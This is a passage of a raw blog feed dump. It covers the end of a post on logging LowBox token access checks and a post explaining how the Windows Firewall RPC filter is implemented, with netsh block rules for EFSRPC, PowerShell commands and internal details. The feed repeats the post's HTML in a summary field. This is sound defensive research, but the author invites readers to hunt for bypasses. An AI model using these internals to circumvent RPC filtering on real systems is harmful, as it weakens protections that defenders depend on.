cleanup the session.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; Stop-NetEventSession -Name $name<br />PS&gt; Remove-NetEventSession -Name $name</span></div><p>You should find an <i>access_trace.etl</i> file in your user's profile directory which will contain the logged events. There are various ways to read this file, the simplest is to use the <i>Get-WinEvent</i> command. As you need to do a bit of parsing of the contents of the log to get out various values I've put together a simple script do that. It's available on github <a href=\"https://gist.github.com/tyranid/a219ed36c7bca7a23036d9f6cedf0cdf\">here</a>. Just run the script passing the name of the log file to convert the events into PowerShell objects.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; parse_access_check_log.ps1 \"$env:USERPROFILE\\access_trace.etl\"</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\">ProcessName&nbsp; &nbsp; &nbsp; &nbsp; : ...\\v1.0\\powershell.exe<br />Mask&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: MaximumAllowed<br />PackageSid&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: S-1-15-2-1445519891-4232675966-...<br />Groups&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: INSIDERDEV\\user<br />Capabilities&nbsp; &nbsp; &nbsp; &nbsp;: NAMED CAPABILITIES\\Permissive Learning Mode<br />SecurityDescriptor : O:BAG:BAD:(A;OICI;KA;;;S-1-5-21-623841239-...</span></div><div style=\"text-align: left;\"><span style=\"font-family: inherit;\"><br /></span></div><div style=\"text-align: left;\"><span style=\"font-family: inherit;\">The log events don't seem to contain the name of the resource being opened, but it does contain the security descriptor and type of the object, what access mask was requested and basic information about the access token used.&nbsp;</span><span style=\"font-family: inherit;\">Hopefully this information is useful to someone.</span></div>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/1176374155533801347"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/1176374155533801347"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2021/09/lowbox-token-permissive-learning-mode.html", "title": "LowBox Token Permissive Learning Mode"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-9860984167419167", "guidislink": true, "link": "https://www.tiraniddo.dev/2021/08/how-windows-firewall-rpc-filter-works.html", "published": "2021-08-21T22:32:00.002-07:00", "published_parsed": [2021, 8, 22, 5, 32, 0, 6, 234, 0], "updated": "2021-08-21T22:44:46.198-07:00", "updated_parsed": [2021, 8, 22, 5, 44, 46, 6, 234, 0], "tags": [{"term": "MSRPC", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "How the Windows Firewall RPC Filter Works", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "How the Windows Firewall RPC Filter Works"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>I did <a href=\"https://twitter.com/tiraniddo/status/1423082196668096514\">promise</a> that I'd put out a blog post on how the Windows RPC filter works. Now that I released my more <a href=\"https://googleprojectzero.blogspot.com/2021/08/understanding-network-access-windows-app.html\">general blog post</a> on the Windows firewall I thought I'd come back to a shorter post about the RPC filter itself. If you don't know the context, the Windows firewall has the ability to restrict access to RPC interfaces. This is interesting due to the renewed interest in all things RPC, especially the <a href=\"https://github.com/topotam/PetitPotam\">PetitPotam</a> trick. For example you can block any access to the <i>EFSRPC</i> interfaces using the following script which you run with the <i>netsh</i> command.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">rpc<br />filter<br />add rule layer=um actiontype=block<br />add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e<br />add filter<br />add rule layer=um actiontype=block<br />add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d<br />add filter<br />quit</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\"><br /></span></div><div style=\"text-align: left;\">This script adds two rules which will block any calls on the RPC interfaces with UUIDs of&nbsp;<i>c681d488-d850-11d0-8c52-00c04fd90f7e</i> and&nbsp;<i>df1941c5-fe89-4e79-bf10-463657acf44d</i>. These correspond to the two EFSRPC interfaces.</div><div style=\"text-align: left;\"><br /></div><div style=\"text-align: left;\">How does this work within the context of the firewall? Does the kernel components of the Windows Filtering Platform have a builtin RPC protocol parser to block the connection? That'd be far too complex, instead everything is done in user-mode by some special layers. If you use <a href=\"https://www.powershellgallery.com/packages/NtObjectManager/1.1.32\">NtObjectManager</a>'s firewall <i>Get-FwLayer</i> command you can check for layers registered to run in user-mode by filtering on the <i>IsUser</i> property.</div><div style=\"text-align: left;\"><br /></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; Get-FwLayer | Where-Object IsUser</span></div><div><span style=\"font-family: courier;\">KeyName&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name</span></div><div><span style=\"font-family: courier;\">-------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_RPC_PROXY_CONN&nbsp; &nbsp; RPC Proxy Connect Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IPSEC_KM_DEMUX_V4 IPsec KM Demux v4 Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_RPC_EP_ADD&nbsp; &nbsp; &nbsp; &nbsp; RPC EP ADD Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_KM_AUTHORIZATION&nbsp; Keying Module Authorization Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IKEEXT_V4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;IKE v4 Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IPSEC_V6&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IPsec v6 Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IPSEC_V4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IPsec v4 Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IKEEXT_V6&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;IKE v6 Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_RPC_UM&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RPC UM Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_RPC_PROXY_IF&nbsp; &nbsp; &nbsp; RPC Proxy Interface Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_RPC_EPMAP&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RPC EPMAP Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IPSEC_KM_DEMUX_V6 IPsec KM Demux v6 Layer</span></div><div><br /></div><div>In the output we can see 5 layers with RPC in the name of the layer.&nbsp;</div><div><ul style=\"text-align: left;\"><li><i>FWPM_LAYER_RPC_EP_ADD</i> - Filter new endpoints created by a process.</li><li><i>FWPM_LAYER_RPC_EPMAP</i> - Filter access to endpoint mapper information.</li><li><i>FWPM_LAYER_RPC_PROXY_CONN</i> - Filter connections to the RPC proxy.</li><li><i>FWPM_LAYER_RPC_PROXY_IF</i> - Filter interface calls through an RPC proxy.</li><li><i>FWPM_LAYER_RPC_UM</i> - Filter interface calls to an RPC server</li></ul><div>Each of these layers is potentially interesting, and you can add rules through <i>netsh</i> for all of them. But we'll just focus on how the&nbsp;<i>FWPM_LAYER_RPC_UM&nbsp;</i>layer works as that's the one the script introduced at the start works with. If you run the following command after adding the RPC filter rules you can view the newly created rules:</div></div><div><br /></div><div><div><span style=\"font-family: courier;\">PS&gt; Get-FwFilter -LayerKey FWPM_LAYER_RPC_UM -Sorted | Format-FwFilter</span></div><div><span style=\"font-family: courier;\">Name&nbsp; &nbsp; &nbsp; &nbsp;: RPCFilter</span></div><div><span style=\"font-family: courier;\">Action Type: Block</span></div><div><span style=\"font-family: courier;\">Key&nbsp; &nbsp; &nbsp; &nbsp; : d4354417-02fa-11ec-95da-00155d010a06</span></div><div><span style=\"font-family: courier;\">Id&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: 78253</span></div><div><span style=\"font-family: courier;\">Description: RPC Filter</span></div><div><span style=\"font-family: courier;\">Layer&nbsp; &nbsp; &nbsp; : FWPM_LAYER_RPC_UM</span></div><div><span style=\"font-family: courier;\">Sub Layer&nbsp; : FWPM_SUBLAYER_UNIVERSAL</span></div><div><span style=\"font-family: courier;\">Flags&nbsp; &nbsp; &nbsp; : Persistent</span></div><div><span style=\"font-family: courier;\">Weight&nbsp; &nbsp; &nbsp;: 567453553048682496</span></div><div><span style=\"font-family: courier;\">Conditions :</span></div><div><span style=\"font-family: courier;\">FieldKeyName&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;MatchType Value</span></div><div><span style=\"font-family: courier;\">------------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;--------- -----</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_IF_UUID Equal&nbsp; &nbsp; &nbsp;df1941c5-fe89-4e79-bf10-463657acf44d</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">Name&nbsp; &nbsp; &nbsp; &nbsp;: RPCFilter</span></div><div><span style=\"font-family: courier;\">Action Type: Block</span></div><div><span style=\"font-family: courier;\">Key&nbsp; &nbsp; &nbsp; &nbsp; : d4354416-02fa-11ec-95da-00155d010a06</span></div><div><span style=\"font-family: courier;\">Id&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: 78252</span></div><div><span style=\"font-family: courier;\">Description: RPC Filter</span></div><div><span style=\"font-family: courier;\">Layer&nbsp; &nbsp; &nbsp; : FWPM_LAYER_RPC_UM</span></div><div><span style=\"font-family: courier;\">Sub Layer&nbsp; : FWPM_SUBLAYER_UNIVERSAL</span></div><div><span style=\"font-family: courier;\">Flags&nbsp; &nbsp; &nbsp; : Persistent</span></div><div><span style=\"font-family: courier;\">Weight&nbsp; &nbsp; &nbsp;: 567453553048682496</span></div><div><span style=\"font-family: courier;\">Conditions :</span></div><div><span style=\"font-family: courier;\">FieldKeyName&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;MatchType Value</span></div><div><span style=\"font-family: courier;\">------------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;--------- -----</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_IF_UUID Equal&nbsp; &nbsp; &nbsp;c681d488-d850-11d0-8c52-00c04fd90f7e</span></div></div><div><br /></div><div>If you're read my general blog post the output should made some sense. The&nbsp;<i>FWPM_CONDITION_RPC_IF_UUID</i> condition key is used to specify the UUID for the interface to match on. The&nbsp;<i>FWPM_LAYER_RPC_UM</i> has many possible fields to filter on, which you can query by inspecting the layer object's <i>Fields</i> property.</div><div><br /></div><div><div><span style=\"font-family: courier;\">PS&gt; (Get-FwLayer -Key FWPM_LAYER_RPC_UM).Fields</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">KeyName&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Type&nbsp; &nbsp; &nbsp; DataType</span></div><div><span style=\"font-family: courier;\">-------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----&nbsp; &nbsp; &nbsp; --------</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_REMOTE_USER_TOKEN&nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;TokenInformation</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_IF_UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;ByteArray16</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_IF_VERSION&nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;UInt16</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_IF_FLAG&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;UInt32</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_DCOM_APP_ID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;ByteArray16</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IMAGE_NAME&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;ByteBlob</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_PROTOCOL&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;UInt8</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_AUTH_TYPE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;UInt8</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_AUTH_LEVEL&nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;UInt8</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_SEC_ENCRYPT_ALGORITHM RawData&nbsp; &nbsp;UInt32</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_SEC_KEY_SIZE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;UInt32</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IP_LOCAL_ADDRESS_V4&nbsp; &nbsp;IPAddress UInt32</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IP_LOCAL_ADDRESS_V6&nbsp; &nbsp;IPAddress ByteArray16</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IP_LOCAL_PORT&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;UInt16</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_PIPE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;ByteBlob</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IP_REMOTE_ADDRESS_V4&nbsp; IPAddress UInt32</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IP_REMOTE_ADDRESS_V6&nbsp; IPAddress ByteArray16</span></div></div><div><br /></div><div>There's quite a few potential configuration options for the filter. You can filter based on the remote user token that's authenticated to the interface. Or you can filters based on the authentication level and type. This could allow you to protect an RPC interface so that all callers have to use Kerberos with at&nbsp;<i>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</i> level.&nbsp;</div><div><br /></div><div>Anyway, configuring it is less important to us, you probably want to know how it works, as the first step to trying to find a way to bypass it is to know where this filter layer is processed (note, I've not found a bypass, but you never know).&nbsp;</div><div><br /></div><div>Perhaps unsurprisingly due to the complexity of the RPC protocol the filtering is implemented within the RPC server process through the <i>RpcRtRemote</i> extension DLL. Except for RPCSS this DLL isn't loaded by default. Instead it's only loaded if there exists a value for the&nbsp;<i>WNF_RPCF_FWMAN_RUNNING</i> WNF state. The following shows the state after adding the two RPC filter rules with <i>netsh</i>.</div><div><br /></div><div><div><span style=\"font-family: courier;\">PS&gt; $wnf = Get-NtWnf -Name 'WNF_RPCF_FWMAN_RUNNING'</span></div><div><span style=\"font-family: courier;\">PS&gt; $wnf.QueryStateData()</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">Data ChangeStamp</span></div><div><span style=\"font-family: courier;\">---- -----------</span></div><div><span style=\"font-family: courier;\">{}&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;2</span></div></div><div><br /></div><div>The RPC runtime sets up a subscription to load the DLL if the WNF value is ever changed. Once loaded the RPC runtime will register all current interfaces to check the firewall. The filter rules are checked when a call is made to the interface during the normal processing of the security callback. The runtime will invoke the&nbsp;<i>FwFilter </i>function inside <i>RpcRtRemote</i>, passing all the details about the firewall interface call. The filter call is only made for DCE/RPC protocols, so not ALPC. It also will only be called if the caller is remote. This is always the case if the call comes via TCP, but for named pipes it will only be called if the pipe was opened via SMB.</div><div><br /></div><div>Here's where we can finally determine how the RPC filter is processed. The <i>FwFilter</i> function builds a list of firewall values corresponding to the list of fields for the&nbsp;<i>FWPM_LAYER_RPC_UM</i> layer and passes them to the&nbsp;<a href=\"https://docs.microsoft.com/en-us/previous-versions/bb309061(v=vs.85)\">FwpsClassifyUser0</a> API along with the numeric ID of the layer. This API will enumerate all filters for the layer and apply the condition checks returning the classification, e.g. block or permit. Based on this classification the RPC runtime can permit or refuse the call.&nbsp;</div><div><br /></div><div>In order for a filter to be accessible for classification the RPC server must have&nbsp;<i>FWPM_ACTRL_OPEN</i> access to the engine and&nbsp;<i>FWPM_ACTRL_CLASSIFY</i> access to the filter. By default the <i>Everyone</i> group has these access rights, however AppContainers and potentially other sandboxes do not. However, in general AppContainer processes don't tend to create privileged RPC servers, at least any which a remote attacker would find useful. You can check the access on various firewall objects using the&nbsp;<i>Get-AccessibleFwObject</i> command.</div><div><br /></div><div><span style=\"font-family: courier;\">PS&gt;&nbsp;$token = Get-NtToken -Filtered -Flags LuaToken</span></div><div><div><span style=\"font-family: courier;\">PS&gt; Get-AccessibleFwObject -Token $token | Where-Object Name -eq RPCFilter</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">TokenId Access&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Name</span></div><div><span style=\"font-family: courier;\">------- ------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;----</span></div><div><span style=\"font-family: courier;\">4ECF80&nbsp; Classify|Open RPCFilter</span></div><div><span style=\"font-family: courier;\">4ECF80&nbsp; Classify|Open RPCFilter</span></div></div><div><br /></div><div>I hope this gives enough information for someone to dig into it further to see if there's any obvious bypass I missed. I'm sure there's probably some fun trick you could do to circumvent restrictions if you look hard enough :-)</div><div><br /></div>"}], "summary": "<p>I did <a href=\"https://twitter.com/tiraniddo/status/1423082196668096514\">promise</a> that I'd put out a blog post on how the Windows RPC filter works. Now that I released my more <a href=\"https://googleprojectzero.blogspot.com/2021/08/understanding-network-access-windows-app.html\">general blog post</a> on the Windows firewall I thought I'd come back to a shorter post about the RPC filter itself. If you don't know the context, the Windows firewall has the ability to restrict access to RPC interfaces. This is interesting due to the renewed interest in all things RPC, especially the <a href=\"https://github.com/topotam/PetitPotam\">PetitPotam</a> trick. For example you can block any access to the <i>EFSRPC</i> interfaces using the following script which you run with the <i>netsh</i> command.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">rpc<br />filter<br />add rule layer=um actiontype=block<br />add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e<br />add filter<br />add rule layer=um actiontype=block<br />add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d<br />add filter<br />quit</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\"><br /></span></div><div style=\"text-align: left;\">This script adds two rules which will block any calls on the RPC interfaces with UUIDs of&nbsp;<i>c681d488-d850-11d0-8c52-00c04fd90f7e</i> and&nbsp;<i>df1941c5-fe89-4e79-bf10-463657acf44d</i>. These correspond to the two EFSRPC interfaces.</div><div style=\"text-align: left;\"><br /></div><div style=\"text-align: left;\">How does this work within the context of the firewall? Does the kernel components of the Windows Filtering Platform have a builtin RPC protocol parser to block the connection? That'd be far too complex, instead everything is done in user-mode by some special layers. If you use <a href=\"https://www.powershellgallery.com/packages/NtObjectManager/1.1.32\">NtObjectManager</a>'s firewall <i>Get-FwLayer</i> command you can check for layers registered to run in user-mode by filtering on the <i>IsUser</i> property.</div><div style=\"text-align: left;\"><br /></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; Get-FwLayer | Where-Object IsUser</span></div><div><span style=\"font-family: courier;\">KeyName&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name</span></div><div><span style=\"font-family: courier;\">-------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_RPC_PROXY_CONN&nbsp; &nbsp; RPC Proxy Connect Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IPSEC_KM_DEMUX_V4 IPsec KM Demux v4 Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_RPC_EP_ADD&nbsp; &nbsp; &nbsp; &nbsp; RPC EP ADD Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_KM_AUTHORIZATION&nbsp; Keying Module Authorization Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IKEEXT_V4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;IKE v4 Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IPSEC_V6&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IPsec v6 Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IPSEC_V4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IPsec v4 Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IKEEXT_V6&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;IKE v6 Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_RPC_UM&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RPC UM Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_RPC_PROXY_IF&nbsp; &nbsp; &nbsp; RPC Proxy Interface Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_RPC_EPMAP&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RPC EPMAP Layer</span></div><div><span style=\"font-family: courier;\">FWPM_LAYER_IPSEC_KM_DEMUX_V6 IPsec KM Demux v6 Layer</span></div><div><br /></div><div>In the output we can see 5 layers with RPC in the name of the layer.&nbsp;</div><div><ul style=\"text-align: left;\"><li><i>FWPM_LAYER_RPC_EP_ADD</i> - Filter new endpoints created by a process.</li><li><i>FWPM_LAYER_RPC_EPMAP</i> - Filter access to endpoint mapper information.</li><li><i>FWPM_LAYER_RPC_PROXY_CONN</i> - Filter connections to the RPC proxy.</li><li><i>FWPM_LAYER_RPC_PROXY_IF</i> - Filter interface calls through an RPC proxy.</li><li><i>FWPM_LAYER_RPC_UM</i> - Filter interface calls to an RPC server</li></ul><div>Each of these layers is potentially interesting, and you can add rules through <i>netsh</i> for all of them. But we'll just focus on how the&nbsp;<i>FWPM_LAYER_RPC_UM&nbsp;</i>layer works as that's the one the script introduced at the start works with. If you run the following command after adding the RPC filter rules you can view the newly created rules:</div></div><div><br /></div><div><div><span style=\"font-family: courier;\">PS&gt; Get-FwFilter -LayerKey FWPM_LAYER_RPC_UM -Sorted | Format-FwFilter</span></div><div><span style=\"font-family: courier;\">Name&nbsp; &nbsp; &nbsp; &nbsp;: RPCFilter</span></div><div><span style=\"font-family: courier;\">Action Type: Block</span></div><div><span style=\"font-family: courier;\">Key&nbsp; &nbsp; &nbsp; &nbsp; : d4354417-02fa-11ec-95da-00155d010a06</span></div><div><span style=\"font-family: courier;\">Id&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: 78253</span></div><div><span style=\"font-family: courier;\">Description: RPC Filter</span></div><div><span style=\"font-family: courier;\">Layer&nbsp; &nbsp; &nbsp; : FWPM_LAYER_RPC_UM</span></div><div><span style=\"font-family: courier;\">Sub Layer&nbsp; : FWPM_SUBLAYER_UNIVERSAL</span></div><div><span style=\"font-family: courier;\">Flags&nbsp; &nbsp; &nbsp; : Persistent</span></div><div><span style=\"font-family: courier;\">Weight&nbsp; &nbsp; &nbsp;: 567453553048682496</span></div><div><span style=\"font-family: courier;\">Conditions :</span></div><div><span style=\"font-family: courier;\">FieldKeyName&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;MatchType Value</span></div><div><span style=\"font-family: courier;\">------------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;--------- -----</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_IF_UUID Equal&nbsp; &nbsp; &nbsp;df1941c5-fe89-4e79-bf10-463657acf44d</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">Name&nbsp; &nbsp; &nbsp; &nbsp;: RPCFilter</span></div><div><span style=\"font-family: courier;\">Action Type: Block</span></div><div><span style=\"font-family: courier;\">Key&nbsp; &nbsp; &nbsp; &nbsp; : d4354416-02fa-11ec-95da-00155d010a06</span></div><div><span style=\"font-family: courier;\">Id&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: 78252</span></div><div><span style=\"font-family: courier;\">Description: RPC Filter</span></div><div><span style=\"font-family: courier;\">Layer&nbsp; &nbsp; &nbsp; : FWPM_LAYER_RPC_UM</span></div><div><span style=\"font-family: courier;\">Sub Layer&nbsp; : FWPM_SUBLAYER_UNIVERSAL</span></div><div><span style=\"font-family: courier;\">Flags&nbsp; &nbsp; &nbsp; : Persistent</span></div><div><span style=\"font-family: courier;\">Weight&nbsp; &nbsp; &nbsp;: 567453553048682496</span></div><div><span style=\"font-family: courier;\">Conditions :</span></div><div><span style=\"font-family: courier;\">FieldKeyName&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;MatchType Value</span></div><div><span style=\"font-family: courier;\">------------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;--------- -----</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_IF_UUID Equal&nbsp; &nbsp; &nbsp;c681d488-d850-11d0-8c52-00c04fd90f7e</span></div></div><div><br /></div><div>If you're read my general blog post the output should made some sense. The&nbsp;<i>FWPM_CONDITION_RPC_IF_UUID</i> condition key is used to specify the UUID for the interface to match on. The&nbsp;<i>FWPM_LAYER_RPC_UM</i> has many possible fields to filter on, which you can query by inspecting the layer object's <i>Fields</i> property.</div><div><br /></div><div><div><span style=\"font-family: courier;\">PS&gt; (Get-FwLayer -Key FWPM_LAYER_RPC_UM).Fields</span></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">KeyName&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Type&nbsp; &nbsp; &nbsp; DataType</span></div><div><span style=\"font-family: courier;\">-------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----&nbsp; &nbsp; &nbsp; --------</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_REMOTE_USER_TOKEN&nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;TokenInformation</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_IF_UUID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;ByteArray16</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_IF_VERSION&nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;UInt16</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_IF_FLAG&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;UInt32</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_DCOM_APP_ID&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;ByteArray16</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_IMAGE_NAME&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;ByteBlob</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_PROTOCOL&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;UInt8</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_AUTH_TYPE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RawData&nbsp; &nbsp;UInt8</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_RPC_AUTH_LEVEL&nbsp; &nbsp; &nbsp; &nbsp; RawData&nbsp; &nbsp;UInt8</span></div><div><span style=\"font-family: courier;\">FWPM_CONDITION_SEC_ENCRYPT_ALGORITHM RawData&nbsp; &nbsp;UInt32</span></div><div><span style=\"font-family: 